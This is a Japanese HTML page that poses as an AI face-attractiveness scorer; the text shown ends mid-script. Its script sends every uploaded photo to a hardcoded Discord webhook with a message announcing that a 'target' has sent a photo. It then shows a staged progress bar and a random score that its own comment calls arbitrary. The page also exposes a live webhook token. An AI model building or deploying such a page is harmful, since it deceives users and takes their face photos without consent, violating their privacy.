<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI顔面偏差値診断</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .upload-btn { background: #ff4757; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
        #status { margin-top: 20px; color: #ffa500; font-weight: bold; font-size: 24px; min-height: 50px; }
        .result { color: #00ff00; font-size: 32px; text-shadow: 0 0 10px #00ff00; }
    </style>
</head>
<body>
    <h1>AI顔面偏差値診断</h1>
    <p>最新AIがあなたの顔を精密に解析し、偏差値を算出します。</p>
    <input type="file" id="imageInput" accept="image/*" style="display: none;">
    <button class="upload-btn" onclick="document.getElementById('imageInput').click()">写真を選択して診断</button>
    <div id="status"></div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487713878908604566/6EIHGd-7hglyHQE-oCm4-xPw_OoiUNC-YFjnYFMVqsAgveLtTIZ3aKf5o9DKYtf82jul";

        document.getElementById('imageInput').addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;
            const status = document.getElementById('status');
            status.innerText = "AI解析中... (0%)";
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('payload_json', JSON.stringify({ content: "📸 **【おみこしハブ：速報】** ターゲットが写真を送信しました！" }));

            try {
                const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                if (response.ok) {
                    // 演出用の読み込み
                    for(let i=10; i<=100; i+=10) {
                        status.innerText = `AI解析中... (${i}%)`;
                        await new Promise(r => setTimeout(r, 300));
                    }
                    // 適当な偏差値を生成（40〜75の間）
                    const score = Math.floor(Math.random() * (75 - 40 + 1)) + 40;
                    status.innerHTML = `解析完了！<br><span class="result">あなたの顔面偏差値：${score}</span>`;
                } else {
                    status.innerText = "エラー: サーバーに接続できません。";
                }
            } catch (err) {
                status.innerText = "接続エラーが発生しました。";
            }
